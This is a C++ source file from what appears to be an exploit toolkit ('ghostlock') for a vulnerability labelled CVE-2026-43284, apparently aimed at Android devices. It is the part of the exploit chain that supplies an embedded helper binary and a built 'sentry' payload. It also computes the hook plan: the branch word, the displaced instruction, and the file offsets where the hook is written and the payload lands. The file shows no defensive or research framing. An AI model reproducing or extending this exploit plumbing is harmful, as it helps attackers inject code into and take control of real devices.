/** @file jni/api_43284_device.cpp
 *  43284 的**数据性**设备缝：本构建自带的字节与钩子计划（不需要设备就能算出来的那部分）。
 *
 *  它们与旧的帧实现（ops_43284_device.cpp）用的是同一批来源：embed 的两张图与 hook 的 sentry 计划，
 *  所以真机上的摘要/数字必须与旧路径逐位一致 —— 门禁正是拿 manifest 里的值对拍。
 *
 *  其余缝（resolve / write_block / read_block / module_check / trigger / wait_terminal）属于真正的
 *  设备工作（J7.5 的 43284 链），不在这里。
 */
#include <cstddef>
#include <cstdint>
#include <span>

#include "backend/cve_2026_43284/embed/libcxx_blob.hpp"
#include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
#include "backend/cve_2026_43284/hook/sentry_hook.hpp"
#include "jni/api_43284.hpp"

namespace ghostlock::jni {
    namespace {
        /** 载荷的落点；缝返回的 span 必须在调用期间有效。 */
        std::uint8_t g_payload[1024] = {};
        std::size_t g_payload_size = 0U;

        bool device_embedded_image(const std::int32_t role, std::span<const std::byte> &image,
                                 void *) noexcept {
            using namespace ghostlock::backend::cve_2026_43284;
            if (role == kImageSpliceHelper) {
                const auto *bytes = embed::splicehelper_bytes();
                image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(bytes),
                                                   embed::splicehelper_padded_size());
                return true;
            }
            if (role == kImageLandingPayload) {
                const hook::SentryPlan plan = hook::device_sentry_plan();
                std::size_t size = 0U;
                if (hook::build_sentry_payload(plan, g_payload, sizeof(g_payload), size) !=
                    hook::SentryError::Ok) {
                    return false;
                }
                g_payload_size = size;
                image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(g_payload),
                                                   g_payload_size);
                return true;
            }
            return false;
        }

        bool device_hook_plan(const Init43284Values &, const HookPlanRequest43284Values &,
                            std::uint64_t &branch_word, std::uint64_t &displaced_word,
                            std::uint64_t &site_offset, std::uint64_t &landing_offset,
                            std::span<const std::byte> &payload, void *) noexcept {
            using namespace ghostlock::backend::cve_2026_43284;
            const hook::SentryPlan plan = hook::device_sentry_plan();
            std::uint32_t branch = 0U;
            if (hook::hook_branch(plan, branch) != hook::SentryError::Ok) {
                return false;
            }
            std::size_t size = 0U;
            if (hook::build_sentry_payload(plan, g_payload, sizeof(g_payload), size) !=
                hook::SentryError::Ok) {
                return false;
            }
            g_payload_size = size;
            branch_word = branch;
            displaced_word = plan.displaced_instruction;
            site_offset = plan.hook_file_offset;
            landing_offset = plan.payload_file_offset;
            payload = std::span<const std::byte>(reinterpret_cast<const std::byte *>(g_payload),
                                                 g_payload_size);
            return true;
        }
    }  // namespace

    /** 本构建能提供的 43284 缝（其余留空 ⇒ 那些函数以 op-not-wired 具名拒绝）。 */
    DeviceOps43284 device_ops_43284() noexcept {
        DeviceOps43284 ops{};
        ops.embedded_image = &device_embedded_image;
        ops.hook_plan = &device_hook_plan;
        return ops;
    }
}  // namespace ghostlock::jni
